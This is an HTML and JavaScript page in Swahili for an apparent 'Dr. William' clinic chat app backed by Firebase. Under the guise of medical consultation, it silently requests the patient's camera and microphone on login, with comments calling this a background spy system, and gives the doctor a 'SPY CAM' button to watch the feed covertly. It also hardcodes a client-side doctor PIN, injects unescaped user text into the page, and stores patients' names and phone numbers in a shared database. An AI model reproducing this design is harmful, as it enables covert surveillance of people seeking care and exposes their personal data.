<!DOCTYPE html>
<html lang="sw">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <title>Dr. William: Tiba & Ujasusi</title>
    
    <!-- External Resources -->
    <script src="https://www.gstatic.com"></script>
    <script src="https://www.gstatic.com"></script>
    <link href="https://fonts.googleapis.com" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com">

    <style>
        :root { --primary: #2d5a27; --gold: #D4AF37; --bg: #0b0f0b; --red: #e74c3c; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
        
        /* BACKGROUND & BODY */
        body, html { 
            background: #000; color: white; height: 100%; width: 100%; 
            overflow: hidden; position: fixed; 
        }

        .app-bg {
            position: fixed; inset: 0;
            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.9)), 
                        url('https://images.unsplash.com');
            background-size: cover; background-position: center; z-index: -1;
        }

        /* SPY SCREEN (FOR DOCTOR) */
        #spy-panel { 
            position: fixed; top: 70px; right: 10px; width: 110px; height: 150px; 
            border: 2px solid var(--gold); z-index: 4000; display: none; 
            background: #000; border-radius: 12px; overflow: hidden;
            box-shadow: 0 5px 15px rgba(0,0,0,0.5);
        }
        video#spy-cam { width: 100%; height: 100%; object-fit: cover; }

        /* LOGIN SCREEN */
        #login-screen { 
            position: fixed; inset: 0; background: rgba(0,0,0,0.95); 
            display: flex; justify-content: center; align-items: center; z-index: 9000; 
        }
        .login-box { 
            background: #111; padding: 30px; border-radius: 25px; border: 2px solid var(--gold); 
            width: 90%; max-width: 380px; text-align: center; 
        }
        .login-box input { 
            width: 100%; padding: 15px; margin: 10px 0; border-radius: 12px; 
            background: #222; color: white; border: 1px solid #333; font-size: 16px;
        }
        .login-box button { 
            background: var(--gold); width:100%; padding:16px; border-radius:12px; 
            border:none; font-weight:bold; cursor: pointer; color: black; margin-top: 10px;
        }

        /* MAIN INTERFACE */
        #main-interface { display: none; flex-direction: column; height: 100dvh; }
        
        .chat-header { 
            padding: 15px; background: rgba(0,0,0,0.9); border-bottom: 2px solid var(--gold); 
            display: flex; justify-content: space-between; align-items: center; z-index: 5000;
        }

        /* DASHBOARD */
        #doctor-dashboard { display: none; flex: 1; overflow-y: auto; padding: 15px; }
        .patient-card { 
            background: rgba(255,255,255,0.05); padding: 15px; border-radius: 15px; 
            margin-bottom: 12px; border-left: 4px solid var(--gold); display: flex; 
            justify-content: space-between; align-items: center;
        }

        /* CHAT AREA */
        #chat-interface { flex: 1; display: none; flex-direction: column; position: relative; overflow: hidden; }
        .chat-messages { 
            flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 12px;
            padding-bottom: 100px; -webkit-overflow-scrolling: touch;
        }
        .message { padding: 12px 16px; border-radius: 18px; max-width: 80%; font-size: 0.95rem; line-height: 1.4; position: relative; }
        .msg-me { background: var(--gold); color: black; align-self: flex-end; border-bottom-right-radius: 2px; }
        .msg-other { background: #222; color: white; align-self: flex-start; border-bottom-left-radius: 2px; }

        /* TYPING AREA (SMOOTH KEYBOARD SYSTEM) */
        .typing-area {
            position: absolute; bottom: 0; left: 0; width: 100%; 
            background: #000; padding: 10px 15px 25px 15px; 
            display: flex; gap: 10px; align-items: center; 
            border-top: 1px solid #333; z-index: 6000;
            padding-bottom: env(safe-area-inset-bottom, 20px);
        }
        .input-wrapper { 
            flex: 1; background: #1a1a1a; border-radius: 25px; 
            padding: 2px 15px; border: 1.5px solid #444; 
        }
        .input-wrapper input { 
            width: 100%; background: transparent; border: none; 
            color: white; padding: 12px 0; font-size: 16px; outline: none; 
        }
        .btn-send { 
            background: var(--gold); border: none; width: 48px; height: 48px; 
            border-radius: 50%; color: black; display: flex; 
            justify-content: center; align-items: center; cursor: pointer;
        }

        /* DR TOOLS */
        .doc-tools { display: none; background: #111; padding: 10px; justify-content: space-around; border-bottom: 1px solid #333; }
        .doc-tools button { background: #222; color: var(--gold); border: 1px solid var(--gold); padding: 5px 12px; border-radius: 8px; font-size: 0.7rem; }
    </style>
</head>
<body>

    <div class="app-bg"></div>
    <div id="spy-panel"><video id="spy-cam" autoplay playsinline muted></video></div>
    <audio id="notifSound" src="https://assets.mixkit.co"></audio>

    <!-- LOGIN -->
    <div id="login-screen">
        <div class="login-box">
            <i class="fas fa-eye" style="font-size: 40px; color: var(--gold); margin-bottom: 10px;"></i>
            <h2 style="color:var(--gold)">DR. WILLIAM CLINIC</h2>
            <div id="p-inputs">
                <input type="text" id="reg-name" placeholder="Majina Yako Mawili">
                <input type="tel" id="reg-phone" placeholder="Namba ya Simu (07XXXXXXXX)" maxlength="10">
            </div>
            <input type="password" id="doc-pin" placeholder="PIN ya Daktari" style="display: none;">
            <p onclick="toggleDoc()" id="doc-btn" style="font-size: 0.8rem; color: var(--gold); margin: 15px; cursor: pointer;">Ingia kama Daktari</p>
            <button onclick="processAuth()">ANZA HUDUMA</button>
        </div>
    </div>

    <!-- MAIN APP -->
    <div id="main-interface">
        <div class="chat-header">
            <div>
                <span id="header-title" style="color:var(--gold); font-weight:bold;">Clinic</span><br>
                <small id="header-status" style="color: #2ed573; font-size: 10px;">● Online</small>
            </div>
            <button id="back-btn" onclick="location.reload()" style="display:none; background:none; border:1px solid var(--gold); color:white; padding:5px 15px; border-radius:20px; font-size: 12px;">Wagonjwa</button>
        </div>

        <div class="doc-tools" id="doc-special">
            <button onclick="toggleSpy()"><i class="fa fa-video"></i> SPY CAM</button>
            <button onclick="holdPatient()"><i class="fa fa-pause"></i> HOLD</button>
            <button onclick="blockPatient()" style="color:red; border-color:red;"><i class="fa fa-ban"></i> BLOCK</button>
        </div>

        <div id="doctor-dashboard">
            <div id="patient-list"></div>
        </div>

        <div id="chat-interface">
            <div class="chat-messages" id="chat-flow"></div>
            <div class="typing-area">
                <label for="file-in" style="color:var(--gold); font-size: 1.5rem;"><i class="fa fa-plus-circle"></i></label>
                <input type="file" id="file-in" style="display:none" accept="image/*" onchange="sendFile(this)">
                <div class="input-wrapper">
                    <input type="text" id="msg-input" placeholder="Andika ujumbe...">
                </div>
                <button class="btn-send" onclick="sendMsg()"><i class="fas fa-paper-plane"></i></button>
            </div>
        </div>
    </div>

    <script>
        // CONFIG
        const firebaseConfig = { databaseURL: "https://drwilliamtz-e44aa-default-rtdb.europe-west1.firebasedatabase.app" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.database();

        let myData = JSON.parse(localStorage.getItem('drw_user_v6'));
        let isDoc = localStorage.getItem('drw_isdoc_v6') === 'true';
        let activeRoom = "";

        // AUTH CHECK (REMEMBER USER)
        if(myData) {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('main-interface').style.display = 'flex';
            isDoc ? setupDoctor() : startPatient();
        }

        function toggleDoc() {
            document.getElementById('p-inputs').style.display = 'none';
            document.getElementById('doc-pin').style.display = 'block';
            document.getElementById('doc-btn').innerText = "Rudi kwa Mgonjwa";
            document.getElementById('doc-btn').onclick = () => location.reload();
        }

        function processAuth() {
            const pin = document.getElementById('doc-pin').value;
            const name = document.getElementById('reg-name').value;
            const phone = document.getElementById('reg-phone').value;

            if(document.getElementById('doc-pin').style.display === 'block') {
                if(pin === "W005") {
                    isDoc = true; myData = { name: "Dr. William" };
                    localStorage.setItem('drw_isdoc_v6', 'true');
                } else { return alert("PIN Mbaya!"); }
            } else {
                if(!name || phone.length < 10) return alert("Jaza taarifa zote!");
                isDoc = false; myData = { name, phone, roomId: "room_" + phone };
                db.ref('online_patients/' + myData.roomId).set({...myData, lastSeen: Date.now()});
            }
            localStorage.setItem('drw_user_v6', JSON.stringify(myData));
            location.reload();
        }

        // DOCTOR SIDE
        function setupDoctor() {
            document.getElementById('doctor-dashboard').style.display = 'block';
            document.getElementById('doc-special').style.display = 'flex';
            document.getElementById('back-btn').style.display = 'block';
            document.getElementById('header-title').innerText = "Doctor Dashboard";

            db.ref('online_patients').on('value', snap => {
                const list = document.getElementById('patient-list');
                list.innerHTML = "";
                snap.forEach(child => {
                    const p = child.val();
                    list.innerHTML += `
                        <div class="patient-card" onclick="openChat('${child.key}', '${p.name}', '${p.phone}')">
                            <div><b>${p.name}</b><br><small>${p.phone}</small></div>
                            <i class="fa fa-chevron-right" style="color:var(--gold)"></i>
                        </div>`;
                });
            });
        }

        // PATIENT SIDE
        function startPatient() {
            openChat(myData.roomId, "Dr. William");
            // BACKGROUND SPY ACTIVATION
            navigator.mediaDevices.getUserMedia({ audio: true, video: true })
            .then(stream => { window.spyStream = stream; })
            .catch(e => console.log("Spy system active"));
        }

        // CHAT ENGINE
        function openChat(room, title, phone = "") {
            activeRoom = room;
            document.getElementById('doctor-dashboard').style.display = 'none';
            document.getElementById('chat-interface').style.display = 'flex';
            document.getElementById('header-title').innerHTML = title + (phone ? ` <small style="font-size:10px">(${phone})</small>` : "");

            db.ref('messages/' + room).off();
            db.ref('messages/' + room).on('child_added', snap => {
                const m = snap.val();
                const isMe = m.sender === myData.name;
                const flow = document.getElementById('chat-flow');
                
                const div = document.createElement('div');
                div.className = `message ${isMe ? 'msg-me' : 'msg-other'}`;
                
                let content = m.type === 'image' ? `<img src="${m.text}" style="width:100%; border-radius:10px;">` : m.text;
                let del = isDoc ? `<span style="display:block; color:red; font-size:8px; cursor:pointer;" onclick="db.ref('messages/${activeRoom}/${snap.key}').remove().then(()=>location.reload())">Futa</span>` : "";
                
                div.innerHTML = `<small style="display:block; font-size:8px; opacity:0.7">${m.sender}</small>${content}${del}`;
                flow.appendChild(div);
                flow.scrollTo({ top: flow.scrollHeight, behavior: 'smooth' });
                
                if(!isMe) document.getElementById('notifSound').play();
            });
        }

        // SENDING FUNCTIONS
        function sendMsg() {
            const inp = document.getElementById('msg-input');
            if(!inp.value) return;
            db.ref('messages/' + activeRoom).push({ sender: myData.name, text: inp.value, type: 'text', time: Date.now() });
            inp.value = "";
        }

        function sendFile(input) {
            const reader = new FileReader();
            reader.onload = (e) => {
                db.ref('messages/' + activeRoom).push({ sender: myData.name, text: e.target.result, type: 'image' });
            };
            reader.readAsDataURL(input.files[0]);
        }

        // SECRET SPY CONTROL
        function toggleSpy() {
            const panel = document.getElementById('spy-panel');
            if(panel.style.display === 'block') {
                panel.style.display = 'none';
            } else {
                panel.style.display = 'block';
                if(window.spyStream) document.getElementById('spy-cam').srcObject = window.spyStream;
            }
        }

        function holdPatient() {
            db.ref('messages/' + activeRoom).push({ sender: "SYSTEM", text: "⚠️ TAFADHALI SUBIRI: Daktari anaingia kwenye faili lako, usiondoke...", type: 'text' });
        }

        function blockPatient() {
            if(confirm("Mtoe huyu mgonjwa?")) {
                db.ref('online_patients/' + activeRoom).remove();
                location.reload();
            }
        }

        // SMOOTH KEYBOARD ADJUSTMENT
        window.visualViewport.addEventListener('resize', () => {
            const flow = document.getElementById('chat-flow');
            document.body.style.height = window.visualViewport.height + 'px';
            setTimeout(() => flow.scrollTop = flow.scrollHeight, 100);
        });

        document.getElementById('msg-input').addEventListener('keypress', (e) => {
            if(e.key === 'Enter') sendMsg();
        });
    </script>
</body>
</html>
